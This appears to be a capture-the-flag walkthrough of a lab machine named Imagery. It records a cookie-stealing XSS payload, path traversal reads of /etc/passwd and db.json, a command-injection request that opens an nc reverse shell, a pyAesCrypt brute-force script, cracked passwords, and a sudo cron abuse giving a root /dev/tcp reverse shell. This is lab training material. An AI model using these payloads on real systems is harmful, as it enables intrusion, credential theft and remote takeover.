### Nmap
```
nmap -sV -sC -vv 10.10.11.88

---OUTPUT---
Nmap scan report for 10.10.11.88
Host is up, received reset ttl 63 (0.021s latency).
Scanned at 2025-12-09 18:37:37 EST for 7s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKyy0U7qSOOyGqKW/mnTdFIj9zkAcvMCMWnEhOoQFWUYio6eiBlaFBjhhHuM8hEM0tbeqFbnkQ+6SFDQw6VjP+E=
|   256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBleYkGyL8P6lEEXf1+1feCllblPfSRHnQ9znOKhcnNM
8000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 8000
![[Pasted image 20251209183946.png]]
- can register as : `test@test.com:test`
![[Pasted image 20251209184014.png]]
- I login to find an image upload website
![[Pasted image 20251209184047.png]]

- Report feature. Maybe an admin would open this and we can do an xss payload.
```
<img src=x onerror="document.location='http://10.10.14.21/surprise/'+document.cookie">
```
![[Pasted image 20251209200216.png]]
- I grab the admin's cookie on my listener:
```
nc -lvnp 80

---OUTPUT---
listening on [any] 80 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.11.88] 34566
GET /surprise/session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aTjGkA.9hDwE6HklrJDg-fvrk31g1N6HoE HTTP/1.1
Host: 10.10.14.21
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://0.0.0.0:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```
- I input the admin cookie in my browser and I get a (kind of broken) admin panel. Note that we need to have our listener on for it to work:
![[Pasted image 20251209200313.png]]
![[Pasted image 20251209200713.png]]
- I click on testuesr's log and find an unusual url:
![[Pasted image 20251209200738.png]]
- I test for LFI and grab `/etc/passwd`:
```
http://imagery.htb:8000/admin/get_system_log?log_identifier=/../../../../../etc/passwd
```
- I find users:
```
cat ~/Downloads/passwd | grep "/bin/bash"
```
![[Pasted image 20251209200846.png]]
- Now we need to enumerate the target.
- Looking at `proc/self/environ` we get some more ifnormation:
![[Pasted image 20251209203238.png]]

- I notice `flaskapp.service`
- I also see path: `PATH=/home/web/web/env/bin:/sbin:/usr/bin`
- Using this I can first see what config files are there for flask:
- A quick look at flask repo shows some files like `config.py` and `app.py`
![[Pasted image 20251209203527.png]]

- I search them and get outputs. Importantly in config.py
![[Pasted image 20251209203658.png]]

- This calls db.json which I find too holding md5 password of users from which i crack `testuser@imagery.htb:iambatman`
![[Pasted image 20251209203755.png]]
- Alternatively can download db.json via url
```
http://imagery.htb:8000/admin/get_system_log?log_identifier=../db.json
```
![[Pasted image 20251209203821.png]]

- Here if we also search for `api_edit.py` we will find the critical vulnerability. A hint could be we see imagick checks in config file:
![[Pasted image 20251209204009.png]]
```
if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
```
- This command is taking user input as arguments in a shell command.
```
{"imageId":"00b2b849-68ac-4024-8f69-df19e6eb4caf","transformType":"crop","params":{"x":"0`id`","y":0,"width":2466,"height":2463}}
```
![[Pasted image 20251209205000.png]]
- I enclosed x in quotes and found backtick causes a bash error. i then executed commands inside the backtick and enclosed the whole thing in quotes and i seem to be getting outputs.
- So I execute my reverse shell here:
```
{"imageId":"00b2b849-68ac-4024-8f69-df19e6eb4caf","transformType":"crop","params":{"x":"0`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.21 9999 >/tmp/f`","y":0,"width":2466,"height":2463}}
```
- I grab a shell as user web:
![[Pasted image 20251209205417.png]]
- Looking at linpeas I find an unusual backup file in `/var/backups` with a `.aes` ending. I grab the file and send it to my local machine with nc
```
#Target
nc 10.10.14.21 81 < web_20250806_120723.zip.aes

#Local
nc -lvnp 81 > web_20250806_120723.zip.aes
mv web_20250806_120723.zip.aes web.aes
```
- I then pass file command to analyze it and get a aes file encrypted with `pyAesCrypt`
```
file web.aes 

---OUTPUT---
web.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
```
![[Pasted image 20251209220414.png]]

- I can decrypt it with a bruteforce script using the rockyou wordlist:
```
import pyAesCrypt

bufferSize = 64 * 1024
encrypted_file = "web.aes"
output_file = "web.dec"
wordlist = "/usr/share/wordlists/rockyou.txt"  # change this path

def try_decrypt(password):
    try:
        pyAesCrypt.decryptFile(encrypted_file, output_file, password.strip(), bufferSize)
        return True
    except Exception:
        return False

with open(wordlist, "r", errors="ignore") as f:
    for i, password in enumerate(f, 1):
        pwd = password.strip()
        print(f"[{i}] Trying: {pwd}", end="\r")
        
        if try_decrypt(pwd):
            print(f"\n\n[SUCCESS] Password found: {pwd}")
            print(f"Decrypted to: {output_file}")
            break
    else:
        print("\n[-] Password not found in wordlist.")
```
![[Pasted image 20251209220440.png]]
- I analyze the decrypted file to find its a zip archive:
```
file web.dec 

---OUTPUT---
web.dec: Zip archive data, at least v2.0 to extract, compression method=deflate
```
![[Pasted image 20251209220336.png]]

- I unzip it
```
unzip web.dec
```
- In `db.json` I find user mark's hash which i decrypt in crackstation.net to be `supersmash`
![[Pasted image 20251209220655.png]]

![[Pasted image 20251209220620.png]]

![[Pasted image 20251209220715.png]]

- I switch to mark user
```
su mark
> sumersmash
```

- I grab user flag:
![[Pasted image 20251209220847.png]]

- I check sudo privileges and find something interesting
```
sudo -l

---OUTPUT---
User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```
![[Pasted image 20251209220941.png]]

- I run the command with sudo where it prompts me to either use the `help` or `shell` argument. I am unable to use the shell argument as it asks for a Master Password which i don't have 
![[Pasted image 20251209221050.png]]

- I then check the `help` command which says I can reset the password with `mark`'s system pwd:
![[Pasted image 20251209221151.png]]

- I reset the password and on next entry simply press enter to set no password
![[Pasted image 20251209221307.png]]

- Finally I can reach the shell:
![[Pasted image 20251209221406.png]]

- Checking the `help` command there is an auto cron job command I can execute. I can pass this command to get a shell on my listener as `root`:
```
auto add --schedule "* * * * *" --command "bash -c 'bash -i >& /dev/tcp/10.10.14.21/9999 0>&1'" --name "root"
```

![[Pasted image 20251209221846.png]]
- I grab root flag:
![[Pasted image 20251209221931.png]]